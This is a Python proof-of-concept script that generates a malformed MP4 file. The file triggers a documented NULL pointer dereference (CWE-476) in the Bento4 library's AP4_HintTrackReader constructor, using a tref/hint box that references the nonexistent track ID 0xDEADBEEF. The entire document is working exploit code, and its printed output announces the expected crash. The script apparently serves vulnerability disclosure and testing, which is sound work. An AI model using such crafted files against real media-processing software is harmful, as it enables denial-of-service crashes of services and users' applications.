#!/usr/bin/env python3
"""
PoC generator for VULN 002: NULL Pointer Dereference via Unvalidated GetTrack() Return
File: Ap4HintTrackReader.cpp lines 67-70
CWE-476 (NULL Pointer Dereference)

The vulnerability: AP4_HintTrackReader constructor reads media_track_id from the
tref/hint atom, calls movie.GetTrack(media_track_id) which returns NULL if the
track ID doesn't exist, then immediately dereferences the NULL pointer via
m_MediaTrack->GetMediaTimeScale() without a NULL check.
"""

import struct
import os

OUTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.mp4")

def box(name, payload):
    """Build an MP4 box: 4-byte size + 4-byte type + payload."""
    assert len(name) == 4, f"Box name must be 4 bytes: {name!r}"
    if isinstance(name, str):
        name = name.encode('latin-1')
    size = 8 + len(payload)
    return struct.pack('>I', size) + name + payload

def fullbox(name, version, flags, payload):
    """Build a FullBox: box header + version(1) + flags(3) + payload."""
    fb_payload = struct.pack('>B', version) + struct.pack('>I', flags)[1:] + payload
    return box(name, fb_payload)

# ---- ftyp ---------------------------------------------------------------
ftyp_payload = (
    b'isom'          # major brand
    + struct.pack('>I', 0x00000200)  # minor version
    + b'isom'        # compatible brand 1
    + b'iso2'        # compatible brand 2
)
ftyp = box('ftyp', ftyp_payload)

# ---- mvhd ---------------------------------------------------------------
matrix = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)
mvhd_payload = struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000)  # times/timescale/duration/rate
mvhd_payload += struct.pack('>H', 0x0100)   # volume (1.0)
mvhd_payload += b'\x00' * 10               # reserved
mvhd_payload += matrix                      # 36-byte matrix
mvhd_payload += b'\x00' * 24               # pre_defined[6]
mvhd_payload += struct.pack('>I', 2)        # next_track_id = 2 (only track 1 exists)
mvhd = fullbox('mvhd', 0, 0, mvhd_payload)

# ---- tkhd (track_id = 1) ------------------------------------------------
tkhd_payload = struct.pack('>IIIII', 0, 0, 1, 0, 0)  # creation/modification/track_id/reserved/duration
tkhd_payload += b'\x00' * 8    # reserved
tkhd_payload += struct.pack('>HHH', 0, 0, 0)  # layer/alt_group/volume
tkhd_payload += b'\x00' * 2    # reserved
tkhd_payload += matrix          # 36-byte matrix
tkhd_payload += struct.pack('>II', 0, 0)  # width/height
tkhd = fullbox('tkhd', 0, 3, tkhd_payload)  # flags=3 (track enabled + in movie)

# ---- tref/hint ----------------------------------------------------------
# The hint child references track ID 0xDEADBEEF which does NOT exist.
# This causes movie.GetTrack(0xDEADBEEF) to return NULL, triggering the NPD.
NONEXISTENT_TRACK_ID = 0xDEADBEEF
hint_ref_payload = struct.pack('>I', NONEXISTENT_TRACK_ID)
hint_child = box('hint', hint_ref_payload)
tref = box('tref', hint_child)

# ---- mdhd ---------------------------------------------------------------
mdhd_payload = struct.pack('>IIIII', 0, 0, 90000, 0, 0)  # creation/modification/timescale/duration/language_predefined
mdhd_payload += struct.pack('>H', 0x55C4)  # language='und'
mdhd_payload += struct.pack('>H', 0)       # pre_defined
mdhd = fullbox('mdhd', 0, 0, mdhd_payload)

# ---- hdlr (handler_type = 'hint') ---------------------------------------
hdlr_payload = struct.pack('>I', 0)   # pre_defined
hdlr_payload += b'hint'               # handler_type
hdlr_payload += b'\x00' * 12         # reserved
hdlr_payload += b'HintHandler\x00'   # name (null-terminated)
hdlr = fullbox('hdlr', 0, 0, hdlr_payload)

# ---- nmhd (null media header for hint tracks) ---------------------------
nmhd = fullbox('nmhd', 0, 0, b'')

# ---- dref / dinf --------------------------------------------------------
url_payload = fullbox('url ', 0, 1, b'')   # flags=1 = self-contained
dref_payload = struct.pack('>I', 1) + url_payload  # entry_count=1
dref = fullbox('dref', 0, 0, dref_payload)
dinf = box('dinf', dref)

# ---- stbl (empty, no samples) -------------------------------------------
stsd = fullbox('stsd', 0, 0, struct.pack('>I', 0))   # entry_count=0
stts = fullbox('stts', 0, 0, struct.pack('>I', 0))   # entry_count=0
stsc = fullbox('stsc', 0, 0, struct.pack('>I', 0))   # entry_count=0
stsz = fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))  # sample_size=0, count=0
stco = fullbox('stco', 0, 0, struct.pack('>I', 0))   # entry_count=0
stbl = box('stbl', stsd + stts + stsc + stsz + stco)

# ---- minf ---------------------------------------------------------------
minf = box('minf', nmhd + dinf + stbl)

# ---- mdia ---------------------------------------------------------------
mdia = box('mdia', mdhd + hdlr + minf)

# ---- trak (hint track, track_id=1) with tref pointing to 0xDEADBEEF ----
trak = box('trak', tkhd + tref + mdia)

# ---- moov ---------------------------------------------------------------
moov = box('moov', mvhd + trak)

# ---- assemble -----------------------------------------------------------
mp4_data = ftyp + moov

with open(OUTFILE, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTFILE}")
print(f"[+] tref/hint references nonexistent track ID: 0x{NONEXISTENT_TRACK_ID:08X}")
print("[+] Expected: AP4_HintTrackReader constructor dereferences NULL m_MediaTrack -> crash")
